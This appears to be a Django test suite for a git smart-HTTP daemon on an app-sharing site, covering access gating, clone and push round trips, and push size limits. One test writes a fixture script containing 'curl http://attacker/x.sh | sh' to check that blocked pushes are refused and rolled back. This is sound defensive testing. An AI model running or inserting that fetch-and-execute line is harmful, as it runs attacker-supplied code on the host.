"""Real git daemon tests.

Two layers, mirroring the two promises of the feature:
- GateTests: the Django-level auth/gating decisions (401 challenge vs
  403 denied vs 200 advertisement) without needing a network stack.
- LiveTests: real smart-HTTP round trips through dulwich's HTTP client —
  clone, paid-gate, push (with the post-push scan pipeline), and the
  push-denial paths.
"""
import base64
import io
import os
import shutil
import zipfile

from django.test import LiveServerTestCase, TestCase, override_settings
from django.urls import reverse

from dulwich import porcelain
from dulwich.client import HTTPUnauthorized
from dulwich.errors import GitProtocolError

from gallery.models import AppVersion, CloneEvent, ScanJob
from gallery.tests import make_category, make_project, make_user, make_zip_file

GIT_MEDIA = '/tmp/blaqvibes-tests-git'


def basic_auth(username, password):
    token = base64.b64encode(f'{username}:{password}'.encode()).decode()
    return f'Basic {token}'


@override_settings(RATELIMIT_ENABLE=False, MEDIA_ROOT=GIT_MEDIA, SEED_DEMO=False)
class GitGateTests(TestCase):
    def setUp(self):
        self.owner = make_user('gitowner')
        self.buyer = make_user('gitbuyer')
        self.cat = make_category()
        self.project = make_project(self.owner, self.cat, slug='free-vibe', title='Free Vibe')
        self.project.zip_file.save('free.zip', make_zip_file({'app.py': 'print(1)\n'}), save=True)
        self.paid = make_project(self.owner, self.cat, slug='paid-vibe', title='Paid Vibe', star_cost=3)
        self.paid.zip_file.save('paid.zip', make_zip_file({'secret.py': 'X = 1\n'}), save=True)

    def info_refs(self, project, username=None, password=None, service='git-upload-pack'):
        url = reverse('git_clone', kwargs={'username': project.owner.username, 'slug': project.slug})
        headers = {}
        if username:
            headers['HTTP_AUTHORIZATION'] = basic_auth(username, password)
        return self.client.get(url + 'info/refs', {'service': service}, **headers)

    def test_free_vibe_advertises_to_anonymous(self):
        resp = self.info_refs(self.project)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp['Content-Type'], 'application/x-git-upload-pack-advertisement')
        self.assertIn(b'# service=git-upload-pack', resp.content)
        self.assertIn(b'HEAD', resp.content)

    def test_bare_root_get_redirects_to_app_page(self):
        url = reverse('git_clone', kwargs={'username': self.owner.username, 'slug': self.project.slug})
        resp = self.client.get(url)
        self.assertEqual(resp.status_code, 302)
        self.assertIn(self.project.slug, resp['Location'])

    def test_paid_vibe_challenges_anonymous(self):
        resp = self.info_refs(self.paid)
        self.assertEqual(resp.status_code, 401)
        self.assertTrue(resp['WWW-Authenticate'].startswith('Basic realm='))

    def test_paid_vibe_denies_buyer_without_trade(self):
        resp = self.info_refs(self.paid, username='gitbuyer', password='pass12345')
        self.assertEqual(resp.status_code, 403)

    def test_paid_vibe_allows_owner(self):
        resp = self.info_refs(self.paid, username='gitowner', password='pass12345')
        self.assertEqual(resp.status_code, 200)

    def test_bad_credentials_401(self):
        resp = self.info_refs(self.paid, username='gitowner', password='wrong')
        self.assertEqual(resp.status_code, 401)

    def test_git_token_works_as_password(self):
        token = self.buyer.profile.rotate_git_token()
        resp = self.info_refs(self.paid, username='gitbuyer', password=token)
        self.assertEqual(resp.status_code, 403)

    def test_receive_pack_anonymous_challenges(self):
        resp = self.info_refs(self.project, service='git-receive-pack')
        self.assertEqual(resp.status_code, 401)

    def test_receive_pack_stranger_denied(self):
        resp = self.info_refs(self.project, username='gitbuyer', password='pass12345', service='git-receive-pack')
        self.assertEqual(resp.status_code, 403)

    def test_receive_pack_owner_advertises(self):
        resp = self.info_refs(self.project, username='gitowner', password='pass12345', service='git-receive-pack')
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp['Content-Type'], 'application/x-git-receive-pack-advertisement')

    def test_zip_download_logs_clone_event(self):
        self.client.login(username='gitowner', password='pass12345')
        resp = self.client.get(reverse('download_zip', kwargs={'slug': self.project.slug}))
        self.assertEqual(resp.status_code, 200)
        self.project.refresh_from_db()
        self.assertEqual(self.project.clones, 1)
        event = CloneEvent.objects.get(project=self.project)
        self.assertEqual(event.source, 'zip')
        self.assertEqual(event.user, self.owner)

    def test_git_clone_throttle_one_per_hour_per_user(self):
        from gallery.git_daemon import record_clone
        record_clone(self.project, self.buyer, 'git', '10.0.0.1')
        record_clone(self.project, self.buyer, 'git', '10.0.0.1')
        self.assertEqual(CloneEvent.objects.filter(project=self.project, source='git').count(), 1)
        self.project.refresh_from_db()
        self.assertEqual(self.project.clones, 1)


@override_settings(RATELIMIT_ENABLE=False, MEDIA_ROOT=GIT_MEDIA, SEED_DEMO=False)
class GitLiveTests(LiveServerTestCase):
    def setUp(self):
        self.owner = make_user('liveowner')
        self.buyer = make_user('livebuyer')
        self.cat = make_category()
        self.project = make_project(self.owner, self.cat, slug='live-vibe', title='Live Vibe')
        self.project.zip_file.save(
            'live.zip',
            make_zip_file({'app.py': 'print("v1")\n', 'README.md': '# Live\n'}),
            save=True,
        )
        self.url = f'{self.live_server_url}/git/liveowner/live-vibe.git'

    def _clone(self, target, username=None, password=None):
        shutil.rmtree(target, ignore_errors=True)
        url = self.url
        if username:
            url = f'{self.live_server_url.replace("http://", "http://" + username + ":" + password + "@")}/git/liveowner/live-vibe.git'
        return porcelain.clone(url, target, errstream=io.BytesIO())

    def test_clone_free_vibe_round_trip(self):
        target = '/tmp/blaqvibes-git-clone-free'
        self._clone(target)
        self.assertTrue(os.path.exists(os.path.join(target, 'app.py')))
        with open(os.path.join(target, 'app.py')) as fh:
            self.assertIn('print("v1")', fh.read())
        self.assertTrue(CloneEvent.objects.filter(project=self.project, source='git').exists())
        self.project.refresh_from_db()
        self.assertGreaterEqual(self.project.clones, 1)

    def test_clone_paid_requires_credentials(self):
        paid = make_project(self.owner, self.cat, slug='live-paid', title='Live Paid', star_cost=3)
        paid.zip_file.save('livepaid.zip', make_zip_file({'secret.py': 'X = 1\n'}), save=True)
        url = f'{self.live_server_url}/git/liveowner/live-paid.git'
        with self.assertRaises(HTTPUnauthorized):
            porcelain.clone(url, '/tmp/blaqvibes-git-paid-anon', errstream=io.BytesIO())
        with self.assertRaises(GitProtocolError):
            porcelain.clone(
                url, '/tmp/blaqvibes-git-paid-denied', errstream=io.BytesIO(),
                username='livebuyer', password='pass12345',
            )
        target = '/tmp/blaqvibes-git-paid-owner'
        shutil.rmtree(target, ignore_errors=True)
        porcelain.clone(
            url, target, errstream=io.BytesIO(),
            username='liveowner', password='pass12345',
        )

    def test_push_updates_project_and_rescans(self):
        target = '/tmp/blaqvibes-git-push'
        repo = self._clone(target, username='liveowner', password='pass12345')
        with open(os.path.join(target, 'pushed.py'), 'w') as fh:
            fh.write('print("pushed")\n')
        with porcelain.open_repo_closing(repo) as r:
            porcelain.add(r, paths=['pushed.py'])
            porcelain.commit(
                r, message=b'live push test', author=b'Test <t@test.com>',
                committer=b'Test <t@test.com>',
            )
            porcelain.push(
                r, self.url, 'refs/heads/main:refs/heads/main',
                username='liveowner', password='pass12345',
                errstream=io.BytesIO(),
            )
        self.project.refresh_from_db()
        self.assertIn(self.project.status, ('pending', 'published'))
        self.assertGreaterEqual(AppVersion.objects.filter(project=self.project).count(), 1)
        with zipfile.ZipFile(self.project.zip_file) as zf:
            self.assertIn('pushed.py', zf.namelist())
            self.assertIn('print("pushed")', zf.read('pushed.py').decode())
        self.assertEqual(ScanJob.objects.filter(project=self.project).count(), 1)
        report = self.project.scan_report or {}
        self.assertEqual(report.get('last_git_push', {}).get('by'), 'liveowner')

    def test_push_of_blocked_file_is_refused_and_rolled_back(self):
        """A push cannot smuggle what an upload may not carry.

        Why an end-to-end test for this? The bypass was structural, not a
        missing check someone would notice in a diff: `git push` wrote the
        project's current ZIP directly, so the upload validators never ran. The
        assertion set is the whole contract — refused, unchanged, and above all
        NOT cloneable afterwards, which is what a rolled-back ref has to buy.
        """
        target = '/tmp/blaqvibes-git-push-blocked'
        repo = self._clone(target, username='liveowner', password='pass12345')
        with open(os.path.join(target, 'deploy.sh'), 'w') as fh:
            fh.write('#!/bin/sh\ncurl http://attacker/x.sh | sh\n')
        before_status = self.project.status
        before_versions = AppVersion.objects.filter(project=self.project).count()
        before_jobs = ScanJob.objects.filter(project=self.project).count()
        with porcelain.open_repo_closing(repo) as r:
            porcelain.add(r, paths=['deploy.sh'])
            porcelain.commit(r, message=b'blocked payload', author=b'X <x@x.x>', committer=b'X <x@x.x>')
            with self.assertRaises(GitProtocolError):
                porcelain.push(
                    r, self.url, 'refs/heads/main:refs/heads/main',
                    username='liveowner', password='pass12345',
                    errstream=io.BytesIO(),
                )
        self.project.refresh_from_db()
        self.assertEqual(self.project.status, before_status)
        self.assertEqual(AppVersion.objects.filter(project=self.project).count(), before_versions)
        self.assertEqual(ScanJob.objects.filter(project=self.project).count(), before_jobs)
        with zipfile.ZipFile(self.project.zip_file) as zf:
            self.assertNotIn('deploy.sh', zf.namelist())
            self.assertIn('app.py', zf.namelist())
        retried = '/tmp/blaqvibes-git-push-blocked-again'
        self._clone(retried, username='liveowner', password='pass12345')
        self.assertFalse(os.path.exists(os.path.join(retried, 'deploy.sh')))
        self.assertTrue(os.path.exists(os.path.join(retried, 'app.py')))

    def test_push_denied_for_stranger(self):
        target = '/tmp/blaqvibes-git-push-denied'
        repo = self._clone(target, username='liveowner', password='pass12345')
        versions_before = AppVersion.objects.filter(project=self.project).count()
        with open(os.path.join(target, 'evil.py'), 'w') as fh:
            fh.write('print("evil")\n')
        with porcelain.open_repo_closing(repo) as r:
            porcelain.add(r, paths=['evil.py'])
            porcelain.commit(r, message=b'x', author=b'X <x@x.x>', committer=b'X <x@x.x>')
            with self.assertRaises(GitProtocolError):
                porcelain.push(
                    r, self.url, 'refs/heads/main:refs/heads/main',
                    username='livebuyer', password='pass12345',
                    errstream=io.BytesIO(),
                )
        self.project.refresh_from_db()
        self.assertEqual(AppVersion.objects.filter(project=self.project).count(), versions_before)

    def test_reclone_after_push_sees_history(self):
        self.test_push_updates_project_and_rescans()
        target = '/tmp/blaqvibes-git-reclone'
        self._clone(target, username='liveowner', password='pass12345')
        self.assertTrue(os.path.exists(os.path.join(target, 'pushed.py')))
        with porcelain.open_repo_closing(target) as r:
            count = sum(1 for _ in r.get_walker())
            self.assertGreaterEqual(count, 2)


@override_settings(RATELIMIT_ENABLE=False, MEDIA_ROOT=GIT_MEDIA, SEED_DEMO=False)
class GitPushPipelineTests(TestCase):
    """The two pieces of the push path that were wrong in the code, not the config.

    Both regressions are invisible from the outside until they are permanent, so
    they get pinned by unit tests rather than by the live round trips above.
    """

    def test_export_budget_resets_for_every_push(self):
        import io
        import stat
        import types
        import zipfile
        from gallery.git_daemon import MAX_FILES_PER_EXPORT, PushRejected, _export_head_zip

        class _Blob:
            data = b'print(1)\n'

        class _Tree:
            def __init__(self, entries):
                self._entries = entries

            def items(self):
                return list(self._entries)

        class _Repo:
            def __init__(self, entries):
                self._tree = _Tree(entries)
                self._blob = _Blob()

            def get_object(self, sha):
                return self._tree if sha == b'tree' else self._blob

        def entry(index):
            return types.SimpleNamespace(path=f'f{index}.py'.encode(), mode=stat.S_IFREG,
                                         sha=b'blob')

        def exported(repo):
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, 'w') as zf:
                _export_head_zip(repo, b'tree', zf)
            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as check:
                return check.namelist()

        big = _Repo([entry(i) for i in range(MAX_FILES_PER_EXPORT + 5)])
        with self.assertRaises(PushRejected):
            exported(big)
        self.assertEqual(exported(_Repo([entry(0)])), ['f0.py'])

    def test_push_cap_counts_bytes_not_content_length(self):
        import io
        from gallery.git_daemon import _BoundedBodyStream

        stream = _BoundedBodyStream(io.BytesIO(b'A' * 4096), 1024)
        self.assertEqual(len(stream.read()), 1024)
        self.assertTrue(stream.oversize, 'a cut body must be reported, not parsed as a short pack')

        stream = _BoundedBodyStream(io.BytesIO(b'A' * 1024), 1024)
        self.assertEqual(len(stream.read()), 1024)
        self.assertFalse(stream.oversize)
        self.assertEqual(stream.read(16), b'')
        self.assertFalse(stream.oversize)
